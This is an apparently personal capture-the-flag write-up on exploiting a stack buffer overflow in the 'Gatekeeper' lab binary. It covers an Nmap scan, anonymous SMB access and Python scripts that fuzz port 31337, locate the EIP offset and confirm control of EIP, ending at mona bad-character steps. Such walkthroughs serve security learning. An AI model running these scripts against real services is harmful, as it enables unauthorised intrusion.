---
layout: default
title : muzec - Gatekeeper(Buffer Overflow) Writeup
---

![image](https://imgur.com/v4Q1ays.png)


Before going deep probably you will need a Buffer Overflow cheat sheet i put together to help out in any buffer overflow box you can easily grab it here [Buffer Overflow cheat sheet](https://muzec0318.github.io/posts/BufferOverflow.html)

Now let hit it with a Nmap scan first;

```
# Nmap 7.91 scan initiated Sat Apr 10 12:01:47 2021 as: nmap -sC -sV -oA nmap 10.10.178.221
Nmap scan report for 10.10.178.221
Host is up (0.17s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE            VERSION
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-04-09T18:29:19
|_Not valid after:  2021-10-09T18:29:19
|_ssl-date: 2021-04-10T19:06:22+00:00; +3h00m02s from scanner time.
6901/tcp  filtered jetstream
31337/tcp open     Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49161/tcp open     msrpc              Microsoft Windows RPC
49165/tcp open     msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=4/10%Time=6071CC4A%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m02s, deviation: 2h00m00s, median: 3h00m01s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:a2:bd:38:40:d1 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-10T15:06:07-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-10T19:06:07
|_  start_date: 2021-04-10T18:29:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 10 12:06:20 2021 -- 1 IP address (1 host up) scanned in 273.40 seconds

```

Lol some really cool ports i can see but let hit the SMB first to check if we have anonymous logins access to the smb share.

`smbclient -L //IP/ -N`   Listing our the available shares

![image](https://imgur.com/3mGA1vb.png)

Cool guess we have access to the `Users` share let check it out.

`smbclient  //IP/Users -N`  Access in share boom anonymous logins allowed.

![image](https://imgur.com/Ikr7rfV.png)

ahhhhh a window executable file cool let transfer it to our window machine for normal inspecting.

![image](https://imgur.com/LoADpSM.png)

Looking cool on our window machine but i run into a problem the executable file refuse to run i keep getting `VCRUNTIME140.DLL` is missing but i was able to fix that by downloading another `VCRUNTIME140.DLL` on `https://www.dll-files.com/vcruntime140.dll.html` if you have that already i think we are good to go.

Now let open the gatekeeper.exe with Immunity Debugger.

![image](https://imgur.com/1nKbBhb.png)

If you are using my cheat sheet the first thing to do is to make sure shell connection is active, test the fuction for buffer storing.

`nc <target_ip> <port>`   Now the target IP we be my window IP since am running the gatekeeper.exe for testing and the port is `31337` found it in the ports scan.


![image](https://imgur.com/oGIDSJB.png)

Now let go back to the window to check what is going on under the hood lol.

![image](https://imgur.com/35OTIAs.png)

Cool it receiving our input now let try to fuzzer it.

### FUZZING

```

#!/usr/bin/python

# Save to a file with name Fuzzer.py

import socket
import sys

# setup the Target's IP and port to the target.
RHOST = "172.16.139.133"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload Sending 1000 A's
payload = "A"*1000

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

![Image](https://imgur.com/GsmF4Kz.png)

Now let check the window to see what is going on.

![image](https://imgur.com/y4SAiZP.png)

Ahhhhh we got a crashed oh yes it definitely Buffer Overflow now let restart immunity debugger again and open the gatekeeper.exe again.

Now let create some pattern with `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1001` screenshot below;

![image](https://imgur.com/ZtKjSkH.png)

Yes it should be like that now let edit our script below with it.

```

#!/usr/bin/python


import socket
import sys

RHOST = "172.16.139.133"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh"

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

Now let run it.

![image](https://imgur.com/AUS3nwh.png)

Now going back to the window we got a crashed again but now the EIP got changed we can use that to find the offset number.

![image](https://imgur.com/jLdF4yM.png)

### FINDING OFFSET NOW;-

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138`  with the new EIP number we got from the crashed

![Image](https://imgur.com/HBSYXX7.png)

Another script again with the offset number.
```
#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "172.16.139.133"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

# build a happy little message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += "BBBB"                          # SRP overwrite
buf += "CCCC"                          # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```
![image](https://imgur.com/3iWepGY.png)

Cool we overwrite the EIP which mean we have total control over the EIP now.

### FINDING BAD CHARACTERS

Let create a working directory first;-

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```
![Image](https://imgur.com/FooTA5J.png)
